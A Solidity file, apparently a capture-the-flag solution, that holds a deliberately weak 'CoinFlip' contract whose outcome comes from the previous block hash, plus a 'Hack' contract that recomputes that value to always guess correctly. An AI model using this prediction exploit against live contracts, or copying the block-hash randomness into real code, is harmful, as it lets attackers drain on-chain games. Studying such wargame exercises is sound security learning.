// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;


contract Hack {

   CoinFlip coinFlip;

   constructor(address _coinFlip){
       coinFlip = CoinFlip(_coinFlip); 
   }

   function attack() external {
      bool _guess = getGuess();
      bool val = coinFlip.flip(_guess);
      require(val==true);
   }

   function getGuess() private view returns (bool) {
        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
        uint256 _coinFlip = blockValue / FACTOR;
        bool side = _coinFlip == 1 ? true : false;
        return side;
   }


}

contract CoinFlip {
    uint256 public consecutiveWins;
    uint256 lastHash;
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    constructor() {
        consecutiveWins = 0;
    }

    function flip(bool _guess) public returns (bool) {
        uint256 blockValue = uint256(blockhash(block.number - 1));

        if (lastHash == blockValue) {
            revert();
        }

        lastHash = blockValue;
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;

        if (side == _guess) {
            consecutiveWins++;
            return true;
        } else {
            consecutiveWins = 0;
            return false;
        }
    }
}

